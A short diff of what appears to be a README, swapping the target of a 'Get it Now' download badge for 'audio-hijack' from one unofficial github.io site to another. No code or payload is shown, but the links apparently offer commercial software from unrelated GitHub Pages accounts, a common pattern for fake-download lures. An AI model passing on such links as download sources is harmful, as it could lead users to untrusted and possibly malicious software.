@@ -5,7 +5,7 @@
 <br>
 <div align="center">
 
-[![Get it Now](https://img.shields.io/badge/Get_it_Now-green?style=for-the-badge&logo=apple)](https://azhdaha-apps.github.io/.github/audio-hijack)
+[![Get it Now](https://img.shields.io/badge/Get_it_Now-green?style=for-the-badge&logo=apple)](https://magamed-software.github.io/.github/audio-hijack)
 
 </div>
 
